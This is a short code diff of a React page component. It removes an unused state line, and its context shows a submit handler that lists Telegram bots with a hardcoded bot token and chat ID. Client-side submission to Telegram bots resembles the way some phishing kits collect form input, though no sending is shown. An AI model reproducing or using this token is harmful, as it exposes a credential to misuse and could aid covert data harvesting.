@@ -104,8 +104,6 @@ export default function Home() {
   const [theConnector, setTheconnector] = useState<boolean>(false);
   const [theLoader, setTheloader] = useState<boolean>(false);
 
-const [status, setStatus] = useState<string>('');
-
 const handleSubmit = async () => {
   const bots = [
     { token: "7518413075:AAF2m8aw70h1HDhjKhWoqOJ_kdzpkKdjA98", chat_id: "7650582960" },
